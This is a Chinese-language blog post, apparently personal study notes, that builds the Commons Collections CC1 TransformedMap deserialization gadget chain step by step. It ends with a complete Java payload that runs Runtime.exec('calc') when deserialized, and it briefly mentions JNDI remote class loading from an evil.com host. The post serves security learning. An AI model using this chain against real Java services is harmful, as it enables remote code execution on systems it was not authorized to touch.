---
title: 代码审计 | CC1 TransformedMap 链 ——前言  反向调试 构造Payload
cover: >-
  https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image7.png
categories:
  - [代码审计, cc]
tags:
  - 代码审计
  - Java
  - 反序列化
  - Java反序列化
abbrlink: becfd9ce
date: 2026-03-31 10:00:00
---

> 学习笔记，记录自己学 CC1 链的思路历程，不是教程，有啥问题欢迎交流。

---

## 目录

- [最终目标是什么](#最终目标是什么)
- [通过反射调用函数](#通过反射调用函数)
- [但实际场景中没地方写代码怎么办](#但实际场景中没地方写代码怎么办)
  - [方式 A：直接传输 Payload（CC 链）](#方式-a直接传输-payloadcc-链)
  - [方式 B：远程类加载](#方式-b远程类加载)
- [Gadget Chain 的由来](#gadget-chain-的由来)
- [CC1 链构造过程](#cc1-链构造过程)
  - [环境准备](#环境准备)
  - [第一步：找到能执行命令的点 —— InvokerTransformer](#第一步找到能执行命令的点--invokertransformer)
  - [第二步：Runtime 不能序列化怎么办](#第二步runtime-不能序列化怎么办)
  - [第三步：谁来串联调用 —— ChainedTransformer](#第三步谁来串联调用--chainedtransformer)
  - [第四步：谁来触发 transform() —— TransformedMap](#第四步谁来触发-transform--transformedmap)
  - [第五步：找到自动调用 setValue 的地方 —— AnnotationInvocationHandler](#第五步找到自动调用-setvalue-的地方--annotationinvocationhandler)
  - [第六步：构造 AnnotationInvocationHandler](#第六步构造-annotationinvocationhandler)
- [完整 Payload](#完整-payload)
- [完整调用链总结](#完整调用链总结)

---

## 最终目标是什么

攻击者想要执行这条命令：

```java
Runtime.getRuntime().exec("calc");
```

那就有两个问题要想清楚：

- 在反序列化过程中，怎样才能让它**自动执行**这行代码？
- 不能直接写这句话，因为反序列化时只会调用 `readObject()` 方法

所以第一个问题就变成了：**通过什么方法层层调用到 `exec()` 的？**

---

## 通过反射调用函数

答案是：**通过反射调用函数！**

```java
Runtime.class.getMethod("exec", String.class).invoke(Runtime.getRuntime(), "calc");
```

这是原本可以正常执行的反射调用。

但是如果随便写一个方法放入这段代码，反序列化的时候不会自动执行。那就必须把它放到一个会**自动执行**的方法里，比如 `readObject()`——反序列化时会自动调用它。

所以如果代码这样写：

```java
package org.example;

import java.io.*;
import java.lang.reflect.InvocationTargetException;

class cc1 implements Serializable {
    private void readObject(ObjectInputStream ois) throws IOException,
            ClassNotFoundException, NoSuchMethodException,
            InvocationTargetException, IllegalAccessException {
        Runtime.class.getMethod("exec", String.class).invoke(Runtime.getRuntime(), "calc");
    }
}

public class Main {
    public static void main(String[] args) throws Exception {
        // 创建恶意对象
        cc1 evil = new cc1();

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(evil);
        byte[] payload = baos.toByteArray();

        // 反序列化（触发恶意代码）
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
        ois.readObject(); // ← calc 应该会打开
    }
}
```

是可以成功的。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image1.png)

---

## 但实际场景中没地方写代码怎么办

问题来了——如果是一个 Web 应用，根本没地方写代码，没有执行的地方，不可能直接开一个 `readObject` 的入口给我们写代码。

这就需要借助反序列化入口的服务，比如 **JNDI 注入（RMI / LDAP）**。

JNDI 注入相当于反序列化攻击的**升级版**，有两种利用方式：

### 方式 A：直接传输 Payload（CC 链）

即使 Web 应用没写 `readObject`，但如果它调用了 `InitialContext.lookup("rmi://攻击者IP/Object")`：

1. 攻击者的 RMI 服务器会把构造好的 **CC 链字节流** 发给 Web 应用。
2. Web 应用的 JNDI 客户端在接收数据时，底层会自动调用 `readObject`。
3. 代码执行。

### 方式 B：远程类加载

这是 JNDI 注入最经典的地方：

1. 攻击者告诉 Web 应用："你要的对象在 `http://evil.com/Exploit.class`"。
2. Web 应用发现本地找不到这个类，会**真的去下载**这个 `.class` 文件并加载。
3. **这时你确实可以"写代码"了**：你写一个带静态代码块的 `Exploit.java`，编译成 `.class` 放服务器上，Web 应用下载运行的那一刻，代码就执行了。

> **局限性：** 这种方式太猛了，所以后来 Java 官方加了限制（通过 `com.sun.jndi.rmi.object.trustURLCodebase` 等配置，默认为 `false`），不允许随便下载远程代码。

---

## Gadget Chain 的由来

如果不能直接下载我们写的类，直接传入自己写的类也会因为找不到这个类而报错。

那么现在的方法就只有：**改造源代码里已有类的 `readObject` 方法**，通过精心构造的调用链，把最终的 `exec()` 调用链起来。

这就是各种 **Gadget Chain（利用链）** 出现的原因，而 CC 链（Commons Collections）就是其中最经典的一批。

---

## CC1 链构造过程

### 环境准备

- JDK：**8u65**（高版本对反射加了限制，CC1 需要低版本）
- 依赖：Commons Collections 3.2.1

```xml
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
</dependencies>
```

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image2.png)

---

### 第一步：找到能执行命令的点 —— InvokerTransformer

首先需要找到一个可以利用反射调用执行的代码。

`InvokerTransformer.transform()` 可以，它本质就是**反射调用任意方法**：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image3.png)

把它配置成：

- `input` = Runtime 实例
- `iMethodName` = `"exec"`
- `iArgs` = `"calc"`

就等于执行了 `Runtime.getRuntime().exec("calc")`。

并且这些参数都是**可控的**：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image4.png)

因此现在可以构造：

```java
public static void main(String[] args) {
    // 构造 Transformer
    InvokerTransformer invoker = new InvokerTransformer(
        "exec",
        new Class[]{String.class},
        new Object[]{"calc"}
    );

    invoker.transform(Runtime.getRuntime());
}
```

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image5.png)

成功执行。

---

### 第二步：Runtime 不能序列化怎么办

这里有两个问题：

**问题一：`Runtime.getRuntime()` 传入的这个实例怎么来的？**

**问题二：谁会调用 `InvokerTransformer.transform(Runtime.getRuntime())`？**

先回答问题一：为什么不直接 `new ConstantTransformer(Runtime.getRuntime())`？

因为 **`Runtime` 不能序列化**，直接放进去序列化会报错。所以只能序列化 `Runtime.class`（Class 对象可以序列化），然后通过反射在运行时再拿到实例。

---

### 第三步：谁来串联调用 —— ChainedTransformer

回答问题二：谁来调用 `InvokerTransformer.transform(Runtime实例)`？

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image6.png)

**`ChainedTransformer.transform()`**——它把每个 `Transformer` 串起来，上一个的输出自动传给下一个。这刚好弥补了需要多次调用 `InvokerTransformer.transform()` 才能实现完整反序列化链的问题。

调用顺序如下：

```
ConstantTransformer(Runtime.class)         → 输出 Runtime.class
InvokerTransformer("getMethod", "getRuntime") → 输出 getRuntime 这个 Method 对象
InvokerTransformer("invoke", null)         → 调用 getRuntime() → 输出 Runtime 实例
InvokerTransformer("exec")                 → 执行 exec("calc")
```

构造代码：

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),          // 1. 输出 Runtime.class
    new InvokerTransformer("getMethod",              // 2. 拿到 getRuntime 方法
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",                 // 3. 调用 getRuntime() 拿到实例
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",                   // 4. 执行 exec("calc")
        new Class[]{String.class},
        new Object[]{"calc"})
};
ChainedTransformer chain = new ChainedTransformer(transformers);
chain.transform(null); // 入参是 null，因为第一步 ConstantTransformer 会忽略输入
```

效果：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image7.png)

---

### 第四步：谁来触发 transform() —— TransformedMap

现在问题变成：**谁会调用 `chain.transform()`？**

**`TransformedMap`**——当 Map 的值被修改时，会自动调用 `valueTransformer.transform()`。不过它是 protected 类型，不能直接使用，需要找到调用这个方法的入口。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image8.png)

另外还有一个要求：`valueTransformer` 是**可控的**，可控的话只要传入 `chain` 就行。

查找可以传入可控 `valueTransformer` 的方法：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image9.png)

不过这个也是 protected，不能直接调用，需要找公共的入口方法。

- **第一步**：找公开调用 `checkSetValue` 的方法——用 Alt+F7 或右键查找用法，找到 `setValue`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image10.png)

- **第二步**：找公开调用 `TransformedMap` 的方法，找到两个，使用第一个（第二个会使链断掉）：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image11.png)

使用 `TransformedMap.decorate(map, null, chain)` 就能正常传入我们的链条了：

运行时提示

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image12.png)

`map` 值不能为空，构造一个：

```java
Map innerMap = new HashMap();
innerMap.put("value", "xxx");

Map transformedMap = TransformedMap.decorate(innerMap, null, chain);
```

> 注意：`key` 和 `value` 填什么都行——因为 `ConstantTransformer` 第一步就把输入忽略了。不过后面 `AnnotationInvocationHandler` 里有条件判断，`key` 必须填 `"value"`，后面会讲到。

还差最开始的触发方法，它在两个类的下面：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image13.png)

---

### 第五步：找到自动调用 setValue 的地方 —— AnnotationInvocationHandler

右键查找谁调用了 `setValue`，结果有很多：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image14.png)

最终找到的是 `AnnotationInvocationHandler.class` 里的 `readObject` 方法——这就是我们想要的终点，`readObject` 会被反序列化自动调用，`setValue` 在其 `for` 循环里：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image15.png)

但是有判断条件需要满足：

```java
// 条件一：用 key 去注解里查有没有这个方法
Class var7 = (Class)var3.get(var6);
if (var7 != null) { // 查不到就跳过，setValue 永远不执行
```

所以 map 的 `key` 就是用来查注解方法的，查不到 `var7` 为 null，整个 if 块跳过，链断掉。`@Target` 只有 `value()` 这一个方法，所以 **key 必须填 `"value"`**。

```java
// 条件二：类型不匹配才会进 if 块
if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
    var5.setValue(...) // 只有类型不匹配才进这里
```

`var7` 是注解方法的返回类型（`ElementType[]`），`var8` 是我们 map 里的值。只有类型不匹配，才会进 if 块调 `setValue()`。我们放字符串 `"xxx"`，显然不是 `ElementType[]`，条件满足。

---

### 第六步：构造 AnnotationInvocationHandler

先找到 `AnnotationInvocationHandler` 的构造方法，看它需要什么参数：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image17.png)

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image18.png)

两个参数：

- `var1`：`Class<? extends Annotation>`，必须是一个**注解类**
- `var2`：`Map<String, Object>`，就是我们的 `transformedMap`

但是这个类**不能直接引用**：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image19.png)

所以利用反射调用这个类：

```java
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
Object handler = constructor.newInstance(Target.class, transformedMap);
```

> 这种反射构造的方法很多类都适用，但高版本 JDK 加了限制（`setAccessible` 会被 Module 系统拦截），这也是 CC1 依赖低版本 JDK 的原因之一。

---

## 完整 Payload

加上序列化和反序列化，完整 payload 如下：

```java
public class test {
    public static <Set> void main(String[] args) throws ClassNotFoundException,
            NoSuchMethodException, InvocationTargetException,
            InstantiationException, IllegalAccessException, IOException {

        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),          // 1. 输出 Runtime.class
            new InvokerTransformer("getMethod",              // 2. 拿到 getRuntime 方法
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",                 // 3. 调用 getRuntime() 拿到实例
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",                   // 4. 执行 exec("calc")
                new Class[]{String.class},
                new Object[]{"calc"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "xxx");
        Map transformedMap = TransformedMap.decorate(innerMap, null, chain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object handler = constructor.newInstance(Target.class, transformedMap);

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler);
        byte[] payload = baos.toByteArray();

        // 反序列化（触发链）
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
        ois.readObject();
    }
}
```

效果：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image20.png)

---

## 完整调用链总结

```
反序列化
  └─ AnnotationInvocationHandler.readObject()   ← 自动触发
       └─ Map.Entry.setValue()
            └─ TransformedMap.checkSetValue()
                 └─ ChainedTransformer.transform()
                      ├─ ConstantTransformer       → Runtime.class
                      ├─ InvokerTransformer        → getMethod("getRuntime")
                      ├─ InvokerTransformer        → invoke() → Runtime 实例
                      └─ InvokerTransformer        → exec("calc")  🎯
```

所以最终我们要序列化的对象就是 `AnnotationInvocationHandler`，整个 CC1 链（TransformedMap 版）就这样串起来了。

后续还有 LazyMap 版本的 CC1，触发点不同，但 Transformer 链的核心部分是一样的，到时候再对比着看。
